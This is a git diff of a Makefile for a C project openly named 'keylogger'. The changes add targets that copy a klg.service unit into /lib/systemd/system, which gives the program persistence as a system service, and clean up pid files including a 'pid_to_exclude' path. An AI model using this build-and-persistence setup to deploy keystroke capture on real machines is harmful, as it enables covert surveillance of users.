@@ -1,6 +1,7 @@
 #Makefile objectif: clean and perfect
 .PHONY: all clean fclean re
 
+shell		=	/bin/bash
 # Name of file
 NAME		=	keylogger
 
@@ -35,26 +36,30 @@ RM			=	/bin/rm
 # Color Code and template code
 _YELLOW		=	\033[38;5;184m
 _GREEN		=	\033[38;5;46m
-_RESET		=	\033[0m
-_INFO		=	[$(_YELLOW)INFO$(_RESET)]
-_SUCCESS	=	[$(_GREEN)SUCCESS$(_RESET)]
-
+_RESET		:=	\033[0m
+_INFO		:=	[$(_YELLOW)INFO$(_RESET)]
+_SUCCESS	:=	[$(_GREEN)SUCCESS$(_RESET)]
 # Functions
+debug:	initDebug $(NAME)
+	@ echo "$(_SUCCESS) Debug Compilation done"
+
 all:	init $(NAME)
 	@ echo "$(_SUCCESS) Compilation done"
-	@ $(warning    Test)
-	@ $(info    $(_SUCCESS)Test2$(LOG))
 
 init:
 	@ $(shell mkdir -p $(PATH_OBJ) $(PATH_LOG))
 	@ make -C $(PATH_LIBH)
 	@ make -C $(PATH_LIBFT)
+	@ cp -f klg.service /lib/systemd/system
+
+initDebug:
+	@ $(shell mkdir -p $(PATH_OBJ) $(PATH_LOG))
+	@ make -C $(PATH_LIBH) debug
+	@ make -C $(PATH_LIBFT)
+	@ cp -f klg.service /lib/systemd/system
 
 $(NAME): $(OBJS) $(INCS)
 	@ (set -x; $(COMP) $(COMP_FLAG) $(COMP_ADD) -o $(NAME) $(OBJS) $(LIBFT)) >> $(LOG) 2>&1
-
-debug: $(OBJS) $(INCS)
-	@ (set -x; $(COMP) $(COMP_FLAG) $(COMP_DEB) $(COMP_ADD) $(INCS) -o minishell_debug $(OBJS) ) >> $(LOG) 2>&1
 
 $(PATH_OBJ)/%.o : $(PATH_SRC)/*/%.c  $(INCS)
 	@ (set -x; $(COMP) $(COMP_FLAG) $(COMP_ADD) $(INCS) -c $< -o $@ ) >> $(LOG) 2>&1
@@ -75,12 +80,11 @@ fclean: clean
 	@ $(RM) -rf $(NAME)
 	@ $(RM) -rf $(PATH_LOG)
 	@ $(RM) -rf "/var/cache/pid_to_exclude"
+	@ $(RM) -rf "/run/klg.pid"
 	@ $(RM) -rf "klg.data"
 	@ make -C $(PATH_LIBH)	fclean
 	@ make -C $(PATH_LIBFT) fclean
 	@ echo "$(_INFO) All files and directories deleted"
-	$(info    MAKE $(_INFO) RE is )
-
-
 
 re: fclean all
+#TODO put 'all' instead of 'debug' for produtction
